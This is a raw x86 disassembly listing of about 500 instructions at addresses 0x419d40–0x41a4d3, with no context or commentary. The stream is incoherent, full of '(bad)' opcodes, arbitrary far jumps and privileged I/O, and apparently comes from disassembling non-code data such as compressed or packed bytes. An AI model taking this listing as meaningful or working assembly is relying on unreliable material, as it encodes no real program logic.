  419d40:	add    ebp,ebx
  419d42:	retf   
  419d43:	jecxz  0x419d6b
  419d45:	imul   ecx,DWORD PTR [ebp-0x1f],0x2a822776
  419d4c:	shr    bl,0x8a
  419d4f:	inc    ecx
  419d50:	sub    dl,BYTE PTR [ecx-0x1d]
  419d53:	inc    edi
  419d54:	jne    0x419d1c
  419d56:	xchg   ebp,eax
  419d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d58:	stc    
  419d59:	inc    esp
  419d5a:	scas   al,BYTE PTR es:[edi]
  419d5b:	jmp    0xcea7:0xc9b955c
  419d62:	inc    BYTE PTR [esi-0x30ebf704]
  419d68:	hlt    
  419d69:	(bad)  
  419d6a:	outs   dx,BYTE PTR ds:[esi]
  419d6b:	or     edx,DWORD PTR [ecx-0x4a]
  419d6e:	mov    ?,edx
  419d70:	std    
  419d71:	cmp    cl,BYTE PTR [ecx+esi*8+0x63]
  419d75:	sbb    eax,0x7ec74479
  419d7a:	inc    edi
  419d7b:	xor    ebx,0x2f
  419d7e:	xchg   DWORD PTR [eax],ebp
  419d80:	xchg   DWORD PTR [ebx+0x3f6d1977],esp
  419d86:	cmp    ebx,ebp
  419d88:	aas    
  419d89:	jecxz  0x419d87
  419d8b:	mov    al,ds:0x1189f70c
  419d90:	cmp    DWORD PTR [ecx],edi
  419d92:	stos   BYTE PTR es:[edi],al
  419d93:	sbb    BYTE PTR [ebx+0x6ea30e5],ch
  419d99:	mov    es,ebp
  419d9b:	aaa    
  419d9c:	rol    DWORD PTR [eax+ebp*4+0xa],cl
  419da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419da1:	xor    al,0x6a
  419da3:	mov    dl,0x5a
  419da5:	das    
  419da6:	or     DWORD PTR [ebx-0x22],0x2e6d1192
  419dad:	mov    dh,0xad
  419daf:	mov    ch,BYTE PTR [ecx+0x5709583d]
  419db5:	(bad)  
  419db6:	fs leave 
  419db8:	mov    eax,ds:0x7c0ac1d9
  419dbd:	repnz ss rcr ch,1
  419dc1:	pop    ebp
  419dc2:	push   edx
  419dc3:	pop    es
  419dc4:	and    al,0xb2
  419dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc7:	pop    edx
  419dc8:	inc    edx
  419dc9:	xor    eax,0x4a6b9af7
  419dce:	sbb    BYTE PTR [eax+0x3ecc700a],bl
  419dd4:	mov    fs,WORD PTR [edx]
  419dd6:	jp     0x419dce
  419dd8:	(bad)  
  419dd9:	mov    ds:0xd66896c7,al
  419dde:	test   eax,0x6cc70ca4
  419de3:	(bad)  
  419de4:	cmp    eax,0x4bfcd8ff
  419de9:	sbb    al,0x47
  419deb:	or     eax,0xc9e6228
  419df0:	ins    BYTE PTR es:[edi],dx
  419df1:	jmp    0xf955e1c
  419df6:	lods   eax,DWORD PTR ds:[esi]
  419df7:	daa    
  419df8:	loopne 0x419e48
  419dfa:	mov    bl,0x9f
  419dfc:	in     al,0x7f
  419dfe:	shl    BYTE PTR [edx+0x77ef295d],0xb0
  419e05:	test   BYTE PTR [ebx],0xda
  419e08:	aad    0x9e
  419e0a:	jno    0x419e8a
  419e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e0d:	jl     0x419ded
  419e0f:	addr16 popa 
  419e11:	frstor [ecx]
  419e13:	adc    ebp,esp
  419e15:	cli    
  419e16:	xchg   edi,eax
  419e17:	xchg   ecx,eax
  419e18:	out    dx,eax
  419e19:	cmp    DWORD PTR [edi+0x8],ebp
  419e1c:	jp     0x419e0e
  419e1e:	or     eax,0x4c0b9202
  419e23:	xchg   edx,eax
  419e24:	or     cl,BYTE PTR [ebx]
  419e26:	xchg   ebp,eax
  419e27:	stc    
  419e28:	inc    edx
  419e29:	push   edi
  419e2a:	and    BYTE PTR [esi-0x6f33dad7],cl
  419e30:	mov    BYTE PTR [edi+0x50],0x94
  419e34:	mov    eax,0x5819a800
  419e39:	mov    edx,0x2ae5860
  419e3e:	push   ecx
  419e3f:	mov    edx,0x29474ffe
  419e44:	aam    0xb2
  419e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e47:	fndisi(8087 only) 
  419e49:	hlt    
  419e4a:	or     edi,DWORD PTR [eax+0x6ca96e93]
  419e50:	mov    bl,ah
  419e52:	push   0x4d
  419e54:	das    
  419e55:	xchg   edx,eax
  419e56:	or     eax,DWORD PTR [edi+0x5b]
  419e59:	add    eax,0xa925787
  419e5e:	inc    edx
  419e5f:	xor    esp,edi
  419e61:	push   ebx
  419e62:	xchg   ecx,eax
  419e63:	lock rcl DWORD PTR [esi+0x702884ef],cl
  419e6a:	adc    cl,dl
  419e6c:	cmc    
  419e6d:	retf   0xefeb
  419e70:	shl    BYTE PTR [esi-0x4a],1
  419e73:	mov    dh,0xf3
  419e75:	and    eax,ecx
  419e77:	repnz dec ecx
  419e79:	sub    DWORD PTR [edx+0x260a7469],0x37
  419e80:	pop    edi
  419e81:	inc    esi
  419e82:	jl     0x419ea7
  419e84:	pop    edi
  419e85:	test   BYTE PTR ds:0x551bfdad,0x58
  419e8c:	sahf   
  419e8d:	jg     0x419f0c
  419e8f:	jae    0x419ee3
  419e91:	fs aaa 
  419e93:	jb     0x419e94
  419e95:	push   ds
  419e96:	fabs   
  419e98:	cs retf 
  419e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e9b:	jb     0x419e4c
  419e9d:	imul   ecx,DWORD PTR [ecx+edx*1-0x20],0x25
  419ea2:	or     BYTE PTR [ecx],0xb
  419ea5:	in     al,dx
  419ea6:	popa   
  419ea7:	sar    BYTE PTR [esi+ebp*8-0x44],1
  419eab:	adc    ah,bh
  419ead:	sti    
  419eae:	xlat   BYTE PTR ds:[ebx]
  419eaf:	je     0x419eb5
  419eb1:	pop    edx
  419eb2:	dec    ecx
  419eb3:	das    
  419eb4:	push   ds
  419eb5:	fiadd  WORD PTR [edx+0x45]
  419eb8:	pop    edx
  419eb9:	in     eax,dx
  419eba:	dec    ecx
  419ebb:	dec    ebp
  419ebc:	test   eax,0x55840e74
  419ec1:	lods   al,BYTE PTR ds:[esi]
  419ec2:	int3   
  419ec3:	jno    0x419ebe
  419ec5:	mov    ch,0xe5
  419ec7:	mov    edi,0x5c5817c0
  419ecc:	cmp    ebp,DWORD PTR [esi]
  419ece:	into   
  419ecf:	jo     0x419e63
  419ed1:	pop    esi
  419ed2:	adc    dl,al
  419ed4:	cld    
  419ed5:	jmp    0x419f07
  419ed7:	cmp    al,BYTE PTR [esp+ebx*8-0x51]
  419edb:	xchg   ebx,eax
  419edc:	inc    ecx
  419edd:	sbb    BYTE PTR [ebp-0x3d],bl
  419ee0:	dec    eax
  419ee1:	sti    
  419ee2:	dec    edi
  419ee3:	repnz (bad) [edi+0xb9d977e]
  419eea:	pushf  
  419eeb:	aam    0x75
  419eed:	push   ecx
  419eee:	xchg   DWORD PTR [edi+0x3c],ebp
  419ef1:	fisubr DWORD PTR [ecx+edx*4-0x5e11a07f]
  419ef8:	xchg   ebx,eax
  419ef9:	pop    ds
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	sbb    al,0x6d
  419efd:	or     eax,0x36b35f45
  419f02:	mov    cl,0xfa
  419f04:	xor    edx,DWORD PTR [esi-0x61]
  419f07:	jmp    0x3b5260dd
  419f0c:	mov    bh,0x9a
  419f0e:	dec    eax
  419f0f:	loope  0x419ecd
  419f11:	cdq    
  419f12:	adc    al,0x54
  419f14:	mov    WORD PTR [ebp+0x45],fs
  419f17:	js     0x419f2a
  419f19:	adc    al,BYTE PTR [ecx]
  419f1b:	imul   esi,ecx,0x601d2bb5
  419f21:	popa   
  419f22:	repnz add eax,esi
  419f25:	cmp    DWORD PTR es:[esi-0x18],esp
  419f29:	jmp    0x7c03:0x5f01bf17
  419f30:	fmul   DWORD PTR ds:0xf80bd50
  419f36:	dec    esi
  419f37:	inc    ecx
  419f38:	mov    ds:0x8581be2f,eax
  419f3d:	ds xchg ecx,eax
  419f3f:	jo     0x419f75
  419f41:	std    
  419f42:	xchg   edi,eax
  419f43:	or     DWORD PTR [eax+ebx*1+0x57cbb9fa],esp
  419f4a:	or     bl,bl
  419f4c:	add    DWORD PTR [ecx-0x34],eax
  419f4f:	(bad)  
  419f50:	ds retf 0x9f94
  419f54:	sbb    DWORD PTR [esi-0x2ee16229],ecx
  419f5a:	adc    al,0xe0
  419f5c:	add    cl,0x4
  419f5f:	dec    ebp
  419f60:	jl     0x419f73
  419f62:	dec    esp
  419f63:	mov    edx,esp
  419f65:	ins    BYTE PTR es:[edi],dx
  419f66:	stos   DWORD PTR es:[edi],eax
  419f67:	or     ebp,ecx
  419f69:	pop    edx
  419f6a:	lods   eax,DWORD PTR ds:[esi]
  419f6b:	sbb    DWORD PTR [eax],eax
  419f6d:	fisttp DWORD PTR [edi-0x734f48bd]
  419f73:	or     al,0x44
  419f75:	push   ebx
  419f76:	pop    esp
  419f77:	jnp    0x419f1f
  419f79:	and    al,0x8
  419f7b:	out    dx,eax
  419f7c:	xchg   edx,eax
  419f7d:	in     al,0xfb
  419f7f:	hlt    
  419f80:	popf   
  419f81:	ja     0x419f86
  419f83:	dec    esi
  419f84:	cld    
  419f85:	push   esp
  419f86:	test   DWORD PTR [ecx],ebp
  419f88:	mov    edi,DWORD PTR [eax]
  419f8a:	aas    
  419f8b:	jbe    0x419fc7
  419f8d:	jg     0x419fe0
  419f8f:	add    BYTE PTR [esi],dl
  419f91:	inc    eax
  419f92:	pop    ebp
  419f93:	loope  0x419f2e
  419f95:	sub    dh,BYTE PTR [eax-0x39]
  419f98:	cmp    eax,0x71702266
  419f9d:	shl    BYTE PTR [eax+0x64cca11a],cl
  419fa3:	adc    eax,0xda9bf681
  419fa8:	xor    al,0xcd
  419faa:	outs   dx,BYTE PTR ds:[esi]
  419fab:	repz enterw 0xa678,0x38
  419fb1:	adc    BYTE PTR [eax-0x67],dh
  419fb4:	mov    bh,ah
  419fb6:	nop
  419fb7:	fisub  WORD PTR [ebx+0x35666c5d]
  419fbd:	adc    DWORD PTR [eax],edi
  419fbf:	sub    esi,0x14a7fd90
  419fc5:	xchg   BYTE PTR [ebx],bl
  419fc7:	adc    ebp,edi
  419fc9:	cmp    BYTE PTR [eax+0x75],ch
  419fcc:	int    0xb3
  419fce:	or     al,0x81
  419fd0:	fist   DWORD PTR [edi]
  419fd2:	add    eax,0x6192a39
  419fd7:	xor    BYTE PTR [ecx+esi*8-0x4],ch
  419fdb:	mov    dh,0xdb
  419fdd:	and    bh,bh
  419fdf:	ret    0x1502
  419fe2:	pushf  
  419fe3:	je     0x419fbc
  419fe5:	dec    esp
  419fe6:	das    
  419fe7:	aaa    
  419fe8:	sar    BYTE PTR [eax+0x4c],1
  419feb:	(bad)  
  419fec:	jmp    0x41a022
  419fee:	data16 fs sti 
  419ff1:	pop    ss
  419ff2:	pop    ecx
  419ff3:	retfw  0x41f8
  419ff7:	mov    al,ds:0xfffd44d5
  419ffc:	pushf  
  419ffd:	add    ebx,DWORD PTR [esi-0x6]
  41a000:	cld    
  41a001:	mov    cl,0x9
  41a003:	loop   0x419fab
  41a005:	repz pop es
  41a007:	push   ecx
  41a008:	aas    
  41a009:	lds    esp,FWORD PTR [eax+0x4953aa0d]
  41a00f:	mov    ds:0xe9368f1d,al
  41a014:	push   edx
  41a015:	(bad)  
  41a016:	bound  edi,QWORD PTR [esi+0x18]
  41a019:	clc    
  41a01a:	fwait
  41a01b:	test   eax,esi
  41a01d:	pop    ebp
  41a01e:	mov    ebx,DWORD PTR [edi+0x58]
  41a021:	mov    ecx,0xf19502cb
  41a026:	imul   DWORD PTR [edi-0x16]
  41a029:	dec    esi
  41a02a:	cdq    
  41a02b:	data16 fcomp QWORD PTR [eax+0x22d1442e]
  41a032:	xchg   esi,eax
  41a033:	pop    ss
  41a034:	les    esi,FWORD PTR [edx]
  41a036:	cwde   
  41a037:	cmp    dh,BYTE PTR [esp+edx*4-0x1a]
  41a03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a03c:	popa   
  41a03d:	cmp    al,0x2
  41a03f:	stos   BYTE PTR es:[edi],al
  41a040:	retf   0xa163
  41a043:	mov    ebx,DWORD PTR gs:[edx]
  41a046:	sti    
  41a047:	mov    bh,0x35
  41a049:	aas    
  41a04a:	xor    al,0x9e
  41a04c:	push   ds
  41a04d:	push   ebp
  41a04e:	imul   esp,DWORD PTR [esi-0x7cedb360],0x6f
  41a055:	(bad)  
  41a056:	mov    ebp,0x92f3e395
  41a05b:	mov    edi,0x34c5e2de
  41a060:	test   BYTE PTR [ecx+0x72dfc050],bh
  41a066:	iret   
  41a067:	xor    BYTE PTR [eax-0x56763274],dh
  41a06d:	lea    ebx,cs:[ebx+0x36]
  41a071:	test   al,0x4d
  41a073:	sub    BYTE PTR [edi+0xcf00b77],bh
  41a079:	mov    eax,ds:0x5032848c
  41a07e:	scas   al,BYTE PTR es:[edi]
  41a07f:	mov    ch,0x3
  41a081:	call   0x9a4284d8
  41a086:	mov    ch,0x63
  41a088:	fild   WORD PTR [ebx]
  41a08a:	(bad)  
  41a08b:	aas    
  41a08c:	and    esi,DWORD PTR [eax+eiz*2+0x36]
  41a090:	cwde   
  41a091:	or     bh,bh
  41a093:	dec    edx
  41a094:	adc    ecx,esp
  41a096:	out    dx,eax
  41a097:	pop    eax
  41a098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a099:	fadd   DWORD PTR [esi+0x66557fa2]
  41a09f:	data16 int 0x85
  41a0a2:	pusha  
  41a0a3:	dec    esi
  41a0a4:	dec    ebp
  41a0a5:	bswap  esi
  41a0a7:	in     eax,dx
  41a0a8:	inc    ebp
  41a0a9:	(bad)  
  41a0aa:	xchg   ebx,eax
  41a0ab:	out    dx,eax
  41a0ac:	stos   DWORD PTR es:[edi],eax
  41a0ad:	cmp    eax,0x39ef472c
  41a0b2:	add    DWORD PTR [edx-0x68],0x49
  41a0b6:	in     eax,0xf4
  41a0b8:	(bad)  
  41a0b9:	lds    edi,FWORD PTR [eax]
  41a0bb:	jne    0x41a0b5
  41a0bd:	ja     0x41a0a1
  41a0bf:	mul    BYTE PTR [ecx*8+0x285c2d12]
  41a0c6:	lods   al,BYTE PTR ds:[esi]
  41a0c7:	push   esp
  41a0c8:	shl    ecx,cl
  41a0ca:	jmp    0xc567afb4
  41a0cf:	inc    esi
  41a0d0:	out    dx,al
  41a0d1:	test   al,0xa2
  41a0d3:	popf   
  41a0d4:	cld    
  41a0d5:	mov    dh,0x8d
  41a0d7:	add    bl,BYTE PTR [edi]
  41a0d9:	adc    eax,0x8ba181df
  41a0de:	pop    edx
  41a0df:	sbb    eax,0x9a43d401
  41a0e4:	rcr    DWORD PTR [bx+di-0x6],0x95
  41a0e9:	cmp    ecx,DWORD PTR [edi]
  41a0eb:	repz mov eax,ds:0x109a7f46
  41a0f1:	pminsw mm0,QWORD PTR [esi+0x33]
  41a0f5:	icebp  
  41a0f6:	(bad)  
  41a0f7:	(bad)  [ebx]
  41a0f9:	mov    ds:0x728e6c18,al
  41a0fe:	sahf   
  41a0ff:	popf   
  41a100:	test   al,0x66
  41a102:	jle    0x41a0d1
  41a104:	push   ebx
  41a105:	jae    0x41a0e7
  41a107:	or     edx,eax
  41a109:	mov    ds:0x8640c5ad,al
  41a10e:	(bad)  
  41a10f:	js     0x41a12e
  41a111:	aam    0xbe
  41a113:	adc    bl,dh
  41a115:	les    edx,FWORD PTR [esi-0x77787b6f]
  41a11b:	cmp    dh,BYTE PTR [edi-0x5563e319]
  41a121:	mov    edi,0x36165e73
  41a126:	add    ah,BYTE PTR [ebx-0x41cc75d]
  41a12c:	mov    al,ds:0xfe373c68
  41a131:	cwde   
  41a132:	aaa    
  41a133:	ret    0xc575
  41a136:	inc    edx
  41a137:	je     0x41a0d2
  41a139:	and    al,0xe
  41a13b:	add    DWORD PTR [esi],ebp
  41a13d:	rol    ah,cl
  41a13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a140:	sbb    BYTE PTR [edi+0x60947759],0x93
  41a147:	ss dec edi
  41a149:	sub    BYTE PTR [ecx+0x79],dh
  41a14c:	mov    dl,0xd0
  41a14e:	js     0x41a14d
  41a150:	test   DWORD PTR [ecx+0x3757e2e],ebx
  41a156:	sub    eax,0xd67ea10f
  41a15b:	fwait
  41a15c:	int3   
  41a15d:	test   eax,0x68558e8f
  41a162:	int    0xba
  41a164:	icebp  
  41a165:	popa   
  41a166:	cmp    eax,0xb3bf1f10
  41a16c:	inc    eax
  41a16d:	push   0x2189ec9e
  41a172:	add    BYTE PTR [ecx],dl
  41a174:	or     bh,BYTE PTR [edx]
  41a176:	mov    ch,0x20
  41a178:	mov    dh,0xe9
  41a17a:	add    al,0xc2
  41a17c:	(bad)  
  41a17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a17f:	jo     0x41a195
  41a181:	cmc    
  41a182:	lods   eax,DWORD PTR ds:[esi]
  41a183:	jg     0x41a164
  41a185:	daa    
  41a186:	ins    DWORD PTR es:[edi],dx
  41a187:	pop    ebp
  41a188:	jmp    0xae2c471a
  41a18d:	mov    bh,0x3a
  41a18f:	jge    0x41a1cb
  41a191:	mov    al,0xfc
  41a193:	jnp    0x41a1a2
  41a195:	and    al,0x2e
  41a197:	dec    ecx
  41a198:	pop    eax
  41a199:	xchg   edi,eax
  41a19a:	and    ebp,DWORD PTR [ecx+0x52]
  41a19d:	pop    ecx
  41a19e:	jo     0x41a18e
  41a1a0:	fdivp  st(0),st
  41a1a2:	or     al,0x13
  41a1a4:	loop   0x41a189
  41a1a6:	mov    ecx,?
  41a1a8:	or     dl,bl
  41a1aa:	test   edx,edx
  41a1ac:	inc    ebx
  41a1ad:	ds nop
  41a1af:	or     eax,0xfa19c76e
  41a1b4:	fistp  WORD PTR [edi+0x24]
  41a1b7:	xchg   edi,eax
  41a1b8:	mov    al,ch
  41a1ba:	andnps xmm3,XMMWORD PTR [edi-0x13]
  41a1be:	inc    esi
  41a1bf:	fsubr  QWORD PTR [ebx-0x3fb42d67]
  41a1c5:	loop   0x41a1d3
  41a1c7:	jns    0x41a1da
  41a1c9:	cmp    bl,BYTE PTR [esi+0x597b54c8]
  41a1cf:	add    DWORD PTR [eax-0x60],ecx
  41a1d2:	leave  
  41a1d3:	iret   
  41a1d4:	aam    0x9d
  41a1d6:	xor    ch,BYTE PTR [eax-0x5e]
  41a1d9:	lahf   
  41a1da:	out    0xb4,al
  41a1dc:	pop    ecx
  41a1dd:	add    ebx,eax
  41a1df:	sbb    BYTE PTR [ecx+0x5d],0x28
  41a1e3:	jnp    0x41a16e
  41a1e5:	clc    
  41a1e6:	in     eax,0x32
  41a1e8:	jno    0x41a20c
  41a1ea:	dec    ecx
  41a1eb:	in     al,dx
  41a1ec:	xor    eax,0x6a104d76
  41a1f1:	jae    0x41a1b9
  41a1f3:	sub    esi,ecx
  41a1f5:	sar    ch,cl
  41a1f7:	(bad)  
  41a1f8:	call   FWORD PTR [ebx+0xdb27fae]
  41a1fe:	push   ebx
  41a1ff:	sbb    al,0x6f
  41a201:	fcom   DWORD PTR [edi+0x1]
  41a204:	clc    
  41a205:	data16 hlt 
  41a207:	scas   al,BYTE PTR es:[edi]
  41a208:	jg     0x41a26f
  41a20a:	inc    esi
  41a20b:	push   es
  41a20c:	xor    eax,0x5f80b4aa
  41a211:	fisttp DWORD PTR [edx+eax*4]
  41a214:	mov    ch,0xa8
  41a216:	jp     0x41a26e
  41a218:	std    
  41a219:	das    
  41a21a:	push   cs
  41a21b:	push   eax
  41a21c:	mov    ds:0x35fc54c8,al
  41a221:	and    eax,0xf2732e0e
  41a226:	push   cs
  41a227:	xchg   DWORD PTR [ebx],esp
  41a229:	mov    dl,0x9
  41a22b:	sub    al,dh
  41a22d:	aad    0xa0
  41a22f:	xor    bh,BYTE PTR [esi-0x3de04e08]
  41a235:	call   0xc757:0x31a1cf2b
  41a23c:	jecxz  0x41a27e
  41a23e:	pop    ebx
  41a23f:	jne    0x41a285
  41a241:	lock mov ds:0x871bd007,al
  41a247:	jns    0x41a23d
  41a249:	cld    
  41a24a:	ror    esp,1
  41a24c:	fwait
  41a24d:	add    al,0x59
  41a24f:	jg     0x41a278
  41a251:	lea    edx,[edi-0x17a1d2cd]
  41a257:	imul   BYTE PTR [esp+ebp*4-0x7d11311]
  41a25e:	stos   BYTE PTR es:[edi],al
  41a25f:	pop    ds
  41a260:	jp     0x41a2c8
  41a262:	and    al,0x54
  41a264:	stos   BYTE PTR es:[edi],al
  41a265:	ja     0x41a1f1
  41a267:	jb     0x41a291
  41a269:	mov    ah,0xb1
  41a26b:	repz push ebp
  41a26d:	int    0x39
  41a26f:	cmp    ah,BYTE PTR [ebx-0x7c94c084]
  41a275:	jle    0x41a2f4
  41a277:	xchg   esp,eax
  41a278:	xchg   edi,eax
  41a279:	push   cs
  41a27a:	test   BYTE PTR [ecx],bl
  41a27c:	neg    BYTE PTR ds:0xfaf9a4ba
  41a282:	pop    edi
  41a283:	or     esp,DWORD PTR [edx-0x40fec810]
  41a289:	(bad)  
  41a28a:	jnp    0x41a309
  41a28c:	dec    eax
  41a28d:	sub    ebx,DWORD PTR [esi-0x50]
  41a290:	pop    ebp
  41a291:	loopne 0x41a27e
  41a293:	fild   WORD PTR [esi]
  41a295:	std    
  41a296:	xor    edi,ebx
  41a298:	jno    0x41a27a
  41a29a:	add    BYTE PTR [edi+0x7d],ch
  41a29d:	jne    0x41a220
  41a29f:	jl     0x41a304
  41a2a1:	daa    
  41a2a2:	xor    al,0x6a
  41a2a4:	cbw    
  41a2a6:	dec    eax
  41a2a7:	cmp    DWORD PTR [edx],0x70ceb623
  41a2ad:	xor    BYTE PTR [edi-0x73],0x3b
  41a2b1:	mov    ds:0x1a2ff80c,eax
  41a2b6:	jmp    0x41a2d0
  41a2b8:	sub    DWORD PTR [esp+edi*4+0x3d],edi
  41a2bc:	retw   
  41a2be:	adc    cl,BYTE PTR [esi-0x38f35747]
  41a2c4:	mov    edx,DWORD PTR [edi+0xa]
  41a2c7:	fild   QWORD PTR [edx-0x77e96181]
  41a2cd:	pop    ecx
  41a2ce:	(bad)  
  41a2cf:	mov    ah,0xd2
  41a2d1:	sub    BYTE PTR [edi+eax*2+0x45],0x7e
  41a2d6:	mov    esi,0xf018872d
  41a2db:	mov    DWORD PTR [eax-0x190fd6b2],esi
  41a2e1:	jae    0x41a2b4
  41a2e3:	mov    ecx,0x95a0a9c2
  41a2e8:	cmp    WORD PTR [ebx+0x1bab79d2],bx
  41a2ef:	xchg   ebx,eax
  41a2f0:	jb     0x41a2f2
  41a2f2:	sbb    eax,0x462bf88
  41a2f7:	in     eax,dx
  41a2f8:	push   ss
  41a2f9:	adc    BYTE PTR [ebp+esi*2-0x1a],cl
  41a2fd:	sub    DWORD PTR [esi+0x35],eax
  41a300:	stc    
  41a301:	push   esp
  41a302:	add    BYTE PTR [ecx+0x2e210e8b],al
  41a308:	push   ebx
  41a309:	hlt    
  41a30a:	inc    esp
  41a30b:	jle    0x41a32b
  41a30d:	mov    edi,0x65ecbd85
  41a312:	mov    ax,ds:0xe24dc21
  41a318:	ss in  al,0x96
  41a31b:	retf   
  41a31c:	jl     0x41a328
  41a31e:	pop    esi
  41a31f:	or     BYTE PTR [edi-0x78],ch
  41a322:	push   ecx
  41a323:	daa    
  41a324:	ins    DWORD PTR es:[edi],dx
  41a325:	pop    ebx
  41a326:	jg     0x41a390
  41a328:	adc    BYTE PTR [ebp-0x466d0c8d],bl
  41a32e:	pop    esi
  41a32f:	fisubr WORD PTR [ecx]
  41a331:	cwde   
  41a332:	mov    al,ds:0xb741d392
  41a337:	pop    ebx
  41a338:	nop
  41a339:	mov    edx,0xe0917ecd
  41a33e:	push   ebx
  41a33f:	adc    ebx,DWORD PTR [edx+esi*1]
  41a342:	xor    DWORD PTR [esi-0x4bfaad73],ebp
  41a348:	sbb    ch,bh
  41a34a:	sub    cl,BYTE PTR [eax+0x44d87326]
  41a350:	mov    eax,ds:0xe8c61c47
  41a355:	(bad)  
  41a357:	jno    0x41a3c9
  41a359:	push   esi
  41a35a:	push   0xba507916
  41a35f:	inc    edx
  41a360:	sub    BYTE PTR [esi+esi*8+0x691eee4d],0xb3
  41a368:	jp     0x41a2f3
  41a36a:	xor    al,0x6d
  41a36c:	test   BYTE PTR ds:0x8e2ce550,bh
  41a372:	mov    edx,DWORD PTR [ecx+0x385ebc67]
  41a378:	retf   
  41a379:	push   ebp
  41a37a:	aam    0xe1
  41a37c:	sub    al,0xa2
  41a37e:	jne    0x41a34f
  41a380:	dec    edi
  41a381:	sub    ebp,DWORD PTR ds:0x62f4289e
  41a387:	push   eax
  41a388:	outs   dx,BYTE PTR ds:[esi]
  41a389:	mov    eax,0xb524a229
  41a38e:	repnz iret 
  41a390:	inc    eax
  41a391:	or     edx,DWORD PTR [ebx+0x76]
  41a394:	adc    al,0x2a
  41a396:	arpl   WORD PTR [ecx-0x2f],di
  41a399:	stc    
  41a39a:	sub    BYTE PTR [ecx+eax*8+0x5b8c0b13],0x99
  41a3a2:	jae    0x41a416
  41a3a4:	mov    ebp,0x3e1fa8db
  41a3a9:	mov    BYTE PTR [ebp-0x73],bh
  41a3ac:	pop    eax
  41a3ad:	ret    
  41a3ae:	pop    esp
  41a3af:	sbb    ebp,DWORD PTR [ecx]
  41a3b1:	cmp    eax,0x44fe012b
  41a3b6:	fild   DWORD PTR [ebx]
  41a3b8:	shr    DWORD PTR [edi-0x50c88ece],1
  41a3be:	aad    0xb4
  41a3c0:	dec    ch
  41a3c2:	data16 out dx,al
  41a3c4:	add    BYTE PTR [ebx+0xf],ch
  41a3c7:	inc    esi
  41a3c8:	mov    ch,0x83
  41a3ca:	(bad)  
  41a3cb:	mov    DWORD PTR [eax-0x7313b5e7],eax
  41a3d1:	xchg   ebx,eax
  41a3d2:	xor    esi,DWORD PTR [esi]
  41a3d4:	fcom   DWORD PTR ds:0x40ab58a7
  41a3da:	sbb    eax,0x275c7995
  41a3df:	das    
  41a3e0:	test   BYTE PTR [esi-0x2a],0x4c
  41a3e4:	push   esp
  41a3e5:	fild   DWORD PTR [ebp+0x21]
  41a3e8:	fwait
  41a3e9:	cmp    al,0xb7
  41a3eb:	xor    al,0x5a
  41a3ed:	rcl    DWORD PTR [edi+0x3c],cl
  41a3f0:	call   0x7e5e:0x36f3d96f
  41a3f7:	outs   dx,BYTE PTR ds:[esi]
  41a3f8:	in     al,dx
  41a3f9:	and    dh,BYTE PTR [esi]
  41a3fb:	xor    DWORD PTR [eax-0xfdfee19],eax
  41a401:	mov    BYTE PTR ds:0xfa88e5f0,ah
  41a407:	jmp    0xc6dc:0x2f57aca3
  41a40e:	fsub   st,st(1)
  41a410:	call   0x8653:0xcceee21e
  41a417:	ja     0x41a46c
  41a419:	imul   ebp,DWORD PTR [edi],0xe97820ea
  41a41f:	xchg   ebp,eax
  41a420:	aas    
  41a421:	dec    edi
  41a422:	out    0x2b,al
  41a424:	out    dx,al
  41a425:	mov    ecx,0xc7337e08
  41a42a:	fadd   DWORD PTR [esi]
  41a42c:	xor    eax,0xd2c26a96
  41a431:	xchg   DWORD PTR [eax-0x5cdf7611],edi
  41a437:	cld    
  41a438:	iret   
  41a439:	mov    bl,0x2c
  41a43b:	pop    DWORD PTR [ebp+0x14afb198]
  41a441:	pop    esp
  41a442:	add    DWORD PTR [eax+ecx*1-0x3e1152d2],esp
  41a449:	jno    0x41a48f
  41a44b:	retf   0x9d77
  41a44e:	jg     0x41a42c
  41a450:	int3   
  41a451:	rcr    BYTE PTR [eax],1
  41a453:	hlt    
  41a454:	arpl   bp,si
  41a456:	pop    eax
  41a457:	push   edx
  41a458:	stc    
  41a459:	sbb    eax,0x1c273f8d
  41a45f:	add    esi,esp
  41a461:	push   ecx
  41a462:	rcl    DWORD PTR [eiz*1-0x16e96654],cl
  41a469:	iret   
  41a46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a46b:	mov    ecx,0x10eff5e8
  41a470:	out    0xb5,al
  41a472:	or     ebp,edx
  41a474:	fsubr  st,st(1)
  41a476:	lods   al,BYTE PTR ds:[esi]
  41a477:	ss xchg edx,eax
  41a479:	popf   
  41a47a:	lea    dx,[edx+0x13a88d25]
  41a481:	add    ah,cl
  41a483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a484:	add    eax,0xa7c67d14
  41a489:	mov    al,ds:0x8c19610c
  41a48e:	imul   esp,DWORD PTR [edx],0x2c
  41a491:	xor    eax,0xa46c8a2d
  41a496:	shr    DWORD PTR [edx+0x4b3cb3be],cl
  41a49c:	rcl    BYTE PTR [ecx-0x2a61efca],1
  41a4a2:	push   edi
  41a4a3:	pop    eax
  41a4a4:	leave  
  41a4a5:	cmp    BYTE PTR [esp+eax*2],bl
  41a4a8:	cld    
  41a4a9:	out    dx,al
  41a4aa:	(bad)  
  41a4ab:	fild   WORD PTR [esi]
  41a4ad:	(bad)  
  41a4ae:	pop    ds
  41a4af:	ins    BYTE PTR es:[edi],dx
  41a4b0:	iret   
  41a4b1:	cmp    dl,bh
  41a4b3:	sbb    cl,bh
  41a4b5:	and    al,0xdb
  41a4b7:	sbb    ebp,ebx
  41a4b9:	nop
  41a4ba:	out    0x1f,al
  41a4bc:	dec    ecx
  41a4bd:	push   ebp
  41a4be:	xchg   ebx,eax
  41a4bf:	sahf   
  41a4c0:	mov    bh,0x8c
  41a4c2:	or     cl,0xe1
  41a4c5:	imul   ebx,DWORD PTR [edi+0x53e4908e],0xffffffd4
  41a4cc:	mov    edi,0xe692e405
  41a4d1:	jns    0x41a4b0
  41a4d3:	ret    0xd838
